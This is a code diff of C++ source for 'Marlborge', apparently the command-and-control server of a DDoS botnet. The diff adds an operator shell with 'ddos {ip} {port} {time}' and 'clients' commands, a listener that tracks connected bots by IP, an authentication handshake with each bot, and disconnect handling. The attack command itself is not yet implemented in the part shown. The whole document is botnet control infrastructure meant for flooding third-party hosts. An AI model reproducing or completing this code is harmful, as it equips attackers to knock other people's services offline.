@@ -11,9 +11,24 @@
 #include <map>
 #include <time.h>
 #include <string>
+#include <csignal>
+
+enum COMMAND {
+	HELP = 0x01,
+	DDOS = 0x02,
+	CLIENTS = 0x03,
+	CLEAR = 0x0F,
+	EXIT = 0xFF,
+	UNKNOWN = 0x00
+};
 
 void ListenThread();
-void ClientThread(SOCKET sock);
+void ClientThread(SOCKET sock, std::string ip);
+void Disconnect(std::string ip);
+
+void SIGINTHandler(int signal);
+
+COMMAND GetCommand(std::string cmd);
 
 std::string GenRandStr(int nLength);
 
@@ -24,7 +39,8 @@ std::mutex clientsMutex;
 #define PORT 5000
 #define MAXCONN 1200
 
-#define HANDSHAKE 0x01
+#define AUTH 0x01
+#define DISCONNECT 0xFF
 
 int main() {
 	WSADATA wsa;
@@ -54,21 +70,37 @@ int main() {
 	std::cout << std::endl << "Github: https://github.com/PR3C14D0/Marlborge" << std::endl;
 	std::cout << std::endl << "Type `help` for displaying all the commands" << std::endl;
 
+	std::signal(SIGINT, SIGINTHandler);
+
 	while (true) {
 		std::cout << "root@marlborge:~# ";
-		std::string option;
-		std::getline(std::cin, option);
+		std::string cmd;
+		std::getline(std::cin, cmd);
 		std::cout << std::endl;
 
-		if (option == "help") {
-			std::cout << "Marlborge command list:\n"
-				"1.- ddos {ip} {port} {time}\n";
-				"2.- connected\n";
-		}
+		COMMAND command = GetCommand(cmd);
 
-		if (option == "connected") {
-			UINT nClientCount = clients.size();
+		UINT nClientCount = clients.size();
+		switch (command) {
+		case HELP:
+			std::cout << "Marlborge command list:\n"
+				"1.- ddos {ip} {port} {time}\n"
+				"2.- clients\n";
+			break;
+		case CLIENTS:
 			std::cout << "Connected clients: " << nClientCount << std::endl;
+			break;
+		case CLEAR:
+			std::cout << "\033[2J\033[1;1H" << std::endl;
+			break;
+		case EXIT:
+			for (std::pair<std::string, SOCKET> client : clients) {
+				Disconnect(client.first);
+			}
+			break;
+		default:
+			std::cout << "[ERROR] " << cmd << " is not a valid command" << std::endl;
+			break;
 		}
 	}
 
@@ -118,7 +150,7 @@ void ListenThread() {
 		clients[clientIp] = client;
 		clientsMutex.unlock();
 
-		std::thread clientThread(ClientThread, client);
+		std::thread clientThread(ClientThread, client, clientIp);
 		clientThread.detach();
 	}
 }
@@ -139,24 +171,70 @@ std::string GenRandStr(int nLength) {
 	return randStr;
 }
 
-void ClientThread(SOCKET sock) {
-	/* HANDSHAKE STAGE */
-	char handshake[1];
-	recv(sock, handshake, sizeof(handshake), 0);
+COMMAND GetCommand(std::string cmd) {
+	COMMAND command = UNKNOWN;
+	if (cmd == "help")
+		command = HELP;
 
-	if (handshake[0] == HANDSHAKE) {
+	if (cmd == "ddos")
+		command = DDOS;
+
+	if (cmd == "clients")
+		command = CLIENTS;
+
+	if (cmd == "clear")
+		command = CLEAR;
+
+	if (cmd == "exit")
+		command = EXIT;
+
+	return command;
+}
+
+void ClientThread(SOCKET sock, std::string ip) {
+	/* AUTHENTICATION STAGE */
+	char auth[1];
+	recv(sock, auth, sizeof(auth), 0);
+
+	if (auth[0] == AUTH) {
 		std::string code = GenRandStr(16);
-		char hsBuff[1024];
+		char authBuff[1024];
 		int nBuffSize = 0;
-		hsBuff[0] = HANDSHAKE;
+		authBuff[0] = AUTH;
 		nBuffSize++;
-		memcpy(&hsBuff[nBuffSize], code.data(), code.size());
+		memcpy(&authBuff[nBuffSize], code.data(), code.size());
 		nBuffSize += code.size();
-		send(sock, hsBuff, nBuffSize, 0);
+		send(sock, authBuff, nBuffSize, 0);
+
+		char respBuff[1024];
+		int nRespSize = recv(sock, respBuff, sizeof(respBuff), 0);
+		if (respBuff[0] != 0x01) 
+			Disconnect(ip);
+
+		std::string respCode;
+		respCode.append(respBuff + 1, code.size());
+
+		if (respCode != code)
+			Disconnect(ip);
 	}
 
 	bool bConnected = true;
 	while (bConnected) {
 
 	}
+}
+
+void Disconnect(std::string ip) {
+	char quit[] = { DISCONNECT };
+	SOCKET sock = clients[ip];
+	send(sock, quit, sizeof(quit), 0);
+	clientsMutex.lock();
+	clients.erase(ip);
+	closesocket(sock);
+	clientsMutex.unlock();
+	return;
+}
+
+void SIGINTHandler(int signal) {
+
 }
